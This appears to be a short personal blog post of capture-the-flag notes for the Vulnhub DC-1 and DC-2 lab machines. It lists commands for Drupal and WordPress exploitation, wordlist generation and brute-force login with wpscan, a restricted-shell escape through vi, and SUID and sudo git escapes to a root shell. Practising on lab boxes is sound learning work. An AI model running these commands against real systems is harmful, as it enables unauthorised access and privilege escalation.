---
title: "Vulnhub DC Series"
date: 2026-04-04 00:00:00 +0800
categories: [vulnhub]
tags: [vulhub]
platform: Vulhub
author: 0xmr
image: /assets/img/posts/vulnhub.webp
excerpt: "Vulnhub Hacking Boxes..."
---

## DC Series Learning...

# dc-1
```bash
# Exploiting CMS Drupal 7 using msf
# msf >  search about drupal 7 Exploits and Auxiliaries.
### Post Exploitation !
[SUID's Files ]:-
Awesome script for SUID Exploitation ====> suid3num.py <=====
find / -type f -perm -4000 2>/dev/null   ---> find

find . -exec /bin/sh -p \; -quit
```

# dc-2
```bash
# Exploiting CMS --> Wordpress 4.7.10
# Password file creation ?
cewl $URL -m 5 -w $PWD/cewl.txt  2>/dev/null

# Login Brute force or userEnumeration...
wpscan --url $URL -e u -P cewl.txt

### Post Exploitation
=======================
[Escape rbash using vi]:- 
=======================
:set shell=/bin/bash
# type one more time this 
:shell  #then enter

export PATH=/bin:/usr/bin:$PATH
export SHELL=/bin/bash:$SHELL

===========================
Password Reuse and [sudo -l] :-
===========================
[/usr/bin/git  SUID Binary Escape]:-
sudo git help add
# Type this
!/bin/bash   #Enter it!
```

# dc-3
```bash
Adding soon!...
```
